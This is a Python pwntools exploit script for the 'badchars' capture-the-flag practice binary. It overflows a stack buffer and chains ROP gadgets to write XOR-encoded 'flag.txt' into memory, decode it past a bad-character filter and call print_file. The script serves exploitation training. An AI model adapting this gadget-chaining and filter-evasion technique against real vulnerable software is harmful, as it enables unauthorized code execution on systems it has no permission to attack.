from pwn import *
elf = context.binary = ELF("./badchars")
io = process("./badchars")

bss_addr =  0x00601038

gadget_write1 =  0x0040069c         # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
gadget_write2 =  0x00400634         # mov qword ptr [r13], r12 ; ret


gadget_xor1 =  0x004006a0           # pop r14 ; pop r15 ; ret
gadget_xor2 =  0x00400628           # xor byte ptr [r15], r14b ; ret

pop_rdi =  0x004006a3               # pop rdi; ret


badchars = ['x','g','a','.']
def write_in_data(data,key: int = 0x2):
    p = b""
    # Write "flag.txt"
    for i in range(0,len(data),8):
        chunk = data[i:i+8].ljust(8,b"\x00")
        p += p64(gadget_write1)
        p += p64(int.from_bytes(chunk,'little'))  #r12
        p += p64(bss_addr + i)                   #r13
        p += p64(0)                               #r14
        p += p64(0)                               #r15
        p += p64(gadget_write2)
    # Xor
    for i in range(0,len(data)):
        p += p64(gadget_xor1)
        p += p64(key)                               #r14  
        p += p64(bss_addr + i)                     #r15
        p += p64(gadget_xor2)
    return p

def xor_bytes(data: bytes, key: int = 0x2) -> bytes:
    return bytes([b ^ key for b in data])


rop = ROP("./badchars")
payload = b"A" * 40
payload += write_in_data(xor_bytes(b"flag.txt"))  # write "flag.txt" en .data
payload += p64(pop_rdi)
payload += p64(bss_addr)              # "flag.txt"
payload += p64(elf.plt['print_file'])  # print_file("flag.txt")

io.recv()
io.sendline(payload)
io.interactive()


